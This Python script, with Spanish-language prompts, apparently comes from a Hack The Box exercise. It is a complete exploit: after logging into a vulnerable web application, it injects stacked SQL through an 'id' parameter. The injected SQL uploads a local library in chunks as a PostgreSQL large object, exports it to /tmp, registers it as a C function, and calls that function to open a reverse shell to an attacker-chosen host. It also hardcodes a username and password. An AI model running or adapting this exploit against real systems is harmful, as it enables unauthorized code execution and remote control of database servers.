from filesplit.split import Split
import os
import requests
import random
import re

def login(username,password,ip_port):
	session = requests.Session()
	body = {"username":f"{username}","password":f"{password}"}
	session.post(f'http://{ip_port}/login',data=body)
	token = session.cookies.get_dict()['Authentication']
	return token

ip_port = input("Digite la direccion IP del servidor donde esta alojado la aplicacion web vulnerable, y el numero de puerto. Ademas, deben estar separados por ':': ")
credenciales = input("Digite el username y password para autenticarse en la aplicacion web vulnerable. Ademas, deben estar separados por una coma: ")
credenciales_1 = credenciales.split(',')
ip_port_local = input("Digite la dirrecion IP de su sistema, y de su puerto local que esta en escucha. Ademas, deben estar separados por una coma: ")
ip_port_local_1 = ip_port_local.split(',')
token = login(credenciales_1[0], credenciales_1[1],ip_port)
entrada = input("Digite la ruta absoluta del archivo del que desea cargar en el servidor web vulnerable, y la ruta absoluta del directorio donde se almacenaran los chunks de 2KB del archivo. Ademas, deben estar separados por una coma: ")
entrada_1 = entrada.split(',')
nombre_archivo = entrada_1[0].split('/')[-1]
split = Split(f"{entrada_1[0]}", f"{entrada_1[1]}")
split.bysize(2048)
contents = os.listdir(f"{entrada_1[1]}")
contents.remove("manifest")
contents.sort()
contador = 0
payload = ""
oid = random.randint(10000,99999)
email = random.randint(0,200)
username = random.randint(0,500)
for i in (contents):
	f = open(f"{entrada_1[1]}/{i}","rb")
	payload += f"SELECT lo_put({oid},{contador},decode($${f.read().hex()}$$,$$hex$$)); "
	contador +=2048
headers = {"Cookie": f"Authentication={token}"}
data = {"title":"Hackthebox","username":"quark55","password":"9lF5%2$juw&L","id":f"1; SELECT lo_create({oid}); {payload} SELECT lo_export({oid},$$/tmp/pg_rev_shell$$); CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT; SELECT rev_shell($${ip_port_local_1[0]}$$, {ip_port_local_1[1]});--"}
respuesta = requests.post(f'http://{ip_port}/dashboard/edit', data=data, headers=headers, allow_redirects=False)
